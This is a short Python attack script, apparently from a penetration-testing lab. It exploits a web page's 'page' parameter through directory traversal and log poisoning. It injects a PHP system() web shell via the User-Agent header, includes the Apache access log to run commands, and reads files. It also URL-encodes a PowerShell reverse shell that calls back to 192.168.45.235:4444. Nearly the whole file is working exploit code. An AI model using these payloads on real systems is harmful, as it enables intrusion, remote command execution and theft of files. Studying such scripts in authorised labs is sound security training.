import requests
import urllib.parse

def url_encode_powershell_command():
    win_payload = "$client = New-Object System.Net.Sockets.TCPClient('192.168.45.235',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%\{0\};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex \". \{ $data \} 2>&1\" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

    # Encode the PowerShell command using urllib.parse.quote
    encoded_command = urllib.parse.quote(win_payload, safe='')
    return encoded_command

def main():
    url = 'http://mountaindesserts.com/meteor/index.php?page='

    win_payload = url_encode_powershell_command()
    print(win_payload)
    payload = f'../../../../../../../../../../xampp/apache/logs/access.log&cmd=type%20hopefullynobodyfindsthisfilebecauseitssupersecret.txt'
    enc_payload = payload.replace('.', '%2E')
    full_url = f'{url}{enc_payload}'
    headers = {
        'User-Agent': "<?php echo system($_GET['cmd']); ?>"
    }
    resp = requests.get(url=full_url,
                        headers=headers)
    print(resp.text)

if __name__ == "__main__":
    main()


'''
Commands:
cmd=cat%20%2Fopt%2Fadmin.bak.php
'''